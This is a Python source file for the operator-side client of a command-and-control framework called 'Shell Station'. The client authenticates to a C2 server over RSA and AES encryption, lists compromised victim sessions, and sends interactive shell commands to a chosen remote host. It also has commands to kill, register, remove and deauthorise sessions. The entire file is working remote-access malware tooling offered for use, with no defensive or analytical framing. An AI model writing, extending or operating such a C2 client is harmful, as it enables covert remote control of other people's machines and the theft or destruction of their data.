#!/usr/bin/python3

from termcolor import colored
import socket
import cmd
import re
import getpass
import sys
import os
import time
import threading
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP

command = ""

def get_credentials():
    class Auth(cmd.Cmd):
        prompt = ""
        def default(self, args):
            global username
            username = input("Username: ")
            global password
            password = getpass.getpass()
            return True

    print("""     _          _ _ 
 ___| |__   ___| | |
/ __| '_ \ / _ \ | |
\__ \ | | |  __/ | |
|___/_| |_|\___|_|_| 
     _        _   _         
 ___| |_ __ _| |_(_) ___  _ __  
/ __| __/ _` | __| |/ _ \| '_ \ 
\__ \ || (_| | |_| | (_) | | | |
|___/\__\__,_|\__|_|\___/|_| |_|
""")
    Auth().onecmd("run")

try:
    a = sys.argv[1]
    b = sys.argv[2]
except IndexError:
    print("""     _          _ _ 
 ___| |__   ___| | |
/ __| '_ \ / _ \ | |
\__ \ | | |  __/ | |
|___/_| |_|\___|_|_| 
     _        _   _         
 ___| |_ __ _| |_(_) ___  _ __  
/ __| __/ _` | __| |/ _ \| '_ \ 
\__ \ || (_| | |_| | (_) | | | |
|___/\__\__,_|\__|_|\___/|_| |_|
""")
    print("Please supply the server ip and port from the command line")
    print("Usage: python3 client.py <ip> <port>")
    print("Example: python3 client.py 127.0.0.1 1234")
    exit()

username = ""
password = ""
get_credentials()

session_id = 0

class KeepAlive():
    def __init__(self) -> None:
        self.idle_time = 0
        self.last_interaction = 0

keepalive_obj = KeepAlive()

class WorkingSessions:
    def __init__(self) -> None:
        self.working = []

ws = WorkingSessions()


class Handler(cmd.Cmd):
    prompt = colored(username,"red",attrs=["bold"]) + " " + colored("# ", "red", attrs=["bold"])
    sessions = {}

    def default(self, line: str):
        print(colored("[-]","red",attrs=["bold"]),"Undefined Command:",line)

    def emptyline(self):
        pass

    def do_confirm(self, args:str):
        try:
            if len(args.split(" ")[0]) > 0:
                ws.working.append(args.split(" ")[0])
                ws.working = list(set(ws.working))
        except Exception as e:
            print(e)

    def do_disconfirm(self, args:str):
        try:
            if len(args.split(" ")[0]) > 0:
                ws.working.remove(args.split(" ")[0])
        except Exception as e:
            print("Invalid session id")

    def do_print(self, args):
        print(ws.working)

    def do_kill(self, args):
        send = aes_encrypt("kill" + args, key)
        send_tuple = tuple_to_str(send)
        s.send(send_tuple.encode())
        
        byte_arr = []
        s.settimeout(5)
        for i in s.recv(1024).decode().split(","):
            byte_arr.append(bytes.fromhex(i))
        byte_arr = tuple(byte_arr)

        decrpyted = aes_decrypt(byte_arr)
        print(decrpyted.decode())

    def do_register(self, args):
        send = aes_encrypt("register" + args, key)
        send_tuple = tuple_to_str(send)
        s.send(send_tuple.encode())

        byte_arr = []
        for i in s.recv(1024).decode().split(","):
            byte_arr.append(bytes.fromhex(i))
        byte_arr = tuple(byte_arr)

        decrpyted = aes_decrypt(byte_arr)
        print(decrpyted.decode())

    def do_remove(self,args):
        send = aes_encrypt("remove" + args, key)
        send_tuple = tuple_to_str(send)
        s.send(send_tuple.encode())

        arr = s.recv(1024).decode().split(",")
        byte_arr = []
        for i in arr:
            byte_arr.append(bytes.fromhex(i))
        byte_arr = tuple(byte_arr)

        decrypted = aes_decrypt(byte_arr)
        print(decrypted.decode())

    def do_clients(self, args):
        send = aes_encrypt("clients", key)
        send_tuple = tuple_to_str(send)
        s.send(send_tuple.encode())

        data = read_stream(s)
        byte_arr = []
        for i in data.decode().split(","):
            byte_arr.append(bytes.fromhex(i))
        byte_arr = tuple(byte_arr)
        decrypted = aes_decrypt(byte_arr)
        print(decrypted.decode())

    def do_deauth(self, args):
        send = aes_encrypt("deauth" + args, key)
        send_tuple = tuple_to_str(send)
        s.send(send_tuple.encode())

        data = read_stream(s)
        byte_arr = []
        for i in data.decode().split(","):
            byte_arr.append(bytes.fromhex(i))
        byte_arr = tuple(byte_arr)
        decrypted = aes_decrypt(byte_arr)
        print(decrypted.decode())

    def do_interact(self, args):
        try:
            if len(self.sessions) == 0:
                self.list_sessions(self)
            session_id = int(args)
            interact(session_id, self.sessions[str(session_id)].split(" ")[0])
        except ValueError:
            print(colored("[-]","red",attrs=["bold"]), "Invalid session id")
            return
        except KeyError:
            print(colored("[-]","red",attrs=["bold"]), "Invalid session id")
            return
        
    def do_sessions(self, args):
        self.list_sessions(self)

    def list_sessions(self,abc):
        send = aes_encrypt("sessions", key) # ECRYPT THE COMMAND
        send_tuple = tuple_to_str(send)
        s.send(send_tuple.encode())

        session_str = ""
        default_timeout = 5
        null_input = 0
        while True:
            try:
                s.settimeout(default_timeout)
                session_str += s.recv(1024).decode("utf-8","ignore")
                default_timeout = 0.1
                
                if len(session_str) == 0:
                    null_input += 1
                
                if null_input >= 10:
                    print(colored("[-]","red",attrs=["bold"]),"Disconnected from the C2 server")
                    os.system("kill " + str(os.getpid()))
                
            except socket.timeout:
                break
        byte_arr = []
        for i in session_str.split(","):
            byte_arr.append(bytes.fromhex(i))
        byte_arr = tuple(byte_arr)
        
        decrypted = aes_decrypt(byte_arr)
        if decrypted == None:
            print("Decryption failed")
            return
            
        decoded = decrypted.decode("utf-8","ignore")
        # print(decoded)
        splitted = decoded.split("\n")
        for i in range(0, len(splitted)):
            if i >= 4:
                cond = False
                for j in ws.working:
                    if j == splitted[i].split(" ")[0]:
                        cond = True
                        break
                if cond:
                    print(splitted[i], colored("[+]","green",attrs=["bold"]))
                else:
                    print(splitted[i])
            else:
                print(splitted[i])

        parsed = decoded.split("\n")[4:-1]
        for i in parsed:
            column = re.sub(' +', ' ', i).split(' ')
            self.sessions[column[0]] = column[2]

    def do_exit(self,args):
        s.close()
        pid = os.getpid()
        os.system("kill -9 " + str(pid))

def read_stream(conn):
    stream = b""
    default_timeout = 5
    null_input = 0
    while True:
        try:
            conn.settimeout(default_timeout)
            stream += conn.recv(1024)
            if len(stream) == 0:
                null_input += 1
            
            if null_input >= 10:
                print(colored("[-]","red",attrs=["bold"]),"Disconnected from the C2 server")
                exit()
            default_timeout = 0.1
        except socket.timeout:
            return stream

def keep_alive(s, obj):
    while True:
        current = int(time.time())
        idle = current - obj.last_interaction
        if idle > 30:                              # Keep the session alive if it has been idle for more than 60 seconds
            send = aes_encrypt("keep_alive", key)
            send_tuple = tuple_to_str(send)
            s.send(send_tuple.encode())
            obj.last_interaction = int(time.time())
            
            string_data = read_stream(s).decode() # Receive the output
            byte_arr = []
            for x in string_data.split(","):
                byte_arr.append(bytes.fromhex(x))
            byte_arr = tuple(byte_arr)
            decrypted = aes_decrypt(byte_arr)
            if decrypted == None:
                print("Decryption of keep alive reply failed")
            else:
                pass
                
        time.sleep(5)
        

def interact(id, os_info):
    try:
        while True:
            cmd_str = input(colored(str(id) + " - " + os_info + " # ", "green", attrs=["bold"])) # set to green
            command = str(id) + "::" + cmd_str

            # if "::Session died::" in cmd_str : # wrong variable. session died must be in response data!!! FIX THIS
            #     print(colored("[-]","red",attrs=["bold"]), "Session died")
            #     return

            if "flush" == cmd_str.replace("\n",""):
                try:
                    flushed = read_stream(s)
                except KeyboardInterrupt:
                    continue
                print(flushed.decode("utf-8","ignore"), flush=True)
                continue

            if (len((command.split("::")[1]).replace("\n","")) == 0):
                continue

            if "bg" == cmd_str.replace("\n",""):
                return

            command = command.replace("\n","")
            send = aes_encrypt(command, key) # ENCRYPTION OF THE COMMAND
            send_tuple = tuple_to_str(send)
            s.send(send_tuple.encode())
            
            keepalive_obj.last_interaction = int(time.time()) # Update the idle time
            
            try:
                socket_timeout = 3
                string_data = ""
                null_input = 0
                while True:
                    try:
                        s.settimeout(socket_timeout)
                        string_data += s.recv(3072).decode("utf-8","ignore")
                        
                        if len(string_data) == 0:
                            null_input += 1
                        
                        if null_input >= 10:
                            print(colored("[-]","red",attrs=["bold"]),"Disconnected from the C2 server")
                            exit()

                        socket_timeout = 0.1
                    except socket.timeout:
                        byte_arr = [] # DECRYPTION OF THE OUTPUT
                        for x in string_data.split(","):
                            byte_arr.append(bytes.fromhex(x))
                        byte_arr = tuple(byte_arr)
                        decrypted = aes_decrypt(byte_arr)
                        if decrypted == None:
                            print("Decryption failed")
                        else:
                            print(decrypted.decode("utf-8","ignore"),flush=True)
                        break
            except KeyboardInterrupt:
                pass
            
            send = aes_encrypt(str(id) + ":: ", key) # ENCRYPTION OF THE COMMAND
            send_tuple = tuple_to_str(send)
            s.send(send_tuple.encode())
            
            socket_timeout = 5
            string_data = ""
            null_input = 0
            while True:
                try:
                    s.settimeout(socket_timeout)
                    string_data += s.recv(3072).decode("utf-8","ignore")
                    
                    if len(string_data) == 0:
                        null_input += 1
                    
                    if null_input >= 10:
                        print(colored("[-]","red",attrs=["bold"]),"Disconnected from the C2 server")
                        exit()

                    socket_timeout = 0.1
                except socket.timeout:
                    byte_arr = [] # DECRYPTION OF THE OUTPUT
                    for x in string_data.split(","):
                        byte_arr.append(bytes.fromhex(x))
                    byte_arr = tuple(byte_arr)
                    decrypted = aes_decrypt(byte_arr)
                    if decrypted == None:
                        pass
                    else:
                        print(decrypted.decode("utf-8","ignore"),flush=True)
                    break

    except KeyboardInterrupt:
        print()
        return

def tuple_to_str(obj):
    result = []
    for i in obj:
        result.append(bytes(i).hex())
    return ",".join(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    # s.connect((sys.argv[1],int(sys.argv[2])))
    s.connect((sys.argv[1], int(sys.argv[2])))
except ConnectionRefusedError:
    print("\nConnection refused")
    exit()

pubKeyByte = s.recv(1024)
pubKey = RSA.import_key(pubKeyByte)

encryptor = PKCS1_OAEP.new(pubKey)
credentials = username + ":" + password
encrypted = encryptor.encrypt(credentials.encode("utf-8"))
s.send(encrypted)
result = s.recv(50).decode()
if result == "failiure":
    print("Authentication failed!")
    exit()
elif result == "client_present":
    print("Login failed: A client has already logged in with these credentials!")
    exit()
elif result == "OK":
    print("Authentication successful!")

key = os.urandom(32) # AES-256 KEY

def initialize_session():
    aes_key_encrypted = encryptor.encrypt(key)
    s.send(aes_key_encrypted)

    time.sleep(0.5)
    tpl = aes_encrypt("client_hello", key)
    stringified = tuple_to_str(tpl)
    s.send(stringified.encode())

    keepalive_obj.last_interaction = int(time.time())


def aes_encrypt(data: str, key):
    try:
        cipher = AES.new(key,AES.MODE_EAX)
        nonce = cipher.nonce
        ciphertext, tag = cipher.encrypt_and_digest(data.encode())
        return (ciphertext, tag, nonce)
    except:
        return None

def aes_decrypt(data): # takes a tuple object in the format (ciphertext, tag, nonce)
    try:
        cipher_text = data[0]
        tag = data[1]
        nonce = data[2]
    except IndexError:
        return None
    decipher = AES.new(key,AES.MODE_EAX,nonce=nonce)
    decrypted = decipher.decrypt(cipher_text)
    try:
        decipher.verify(tag)
        return decrypted
    except ValueError:
        return None


initialize_session()
threading.Thread(target=keep_alive, args=(s,keepalive_obj)).start()

while True:
    try:
        Handler().cmdloop()
    except KeyboardInterrupt:
        print("Type exit to quit")
    except BrokenPipeError:
        print(colored("[*]","blue",attrs=["bold"]),"Connection to C2 server is lost")
        exit()
    except ConnectionResetError:
        print(colored("[*]","blue",attrs=["bold"]),"Connection to C2 server is lost")
        exit()
    except ConnectionAbortedError:
        print(colored("[*]","blue",attrs=["bold"]),"Connection to C2 server is lost")
        exit()
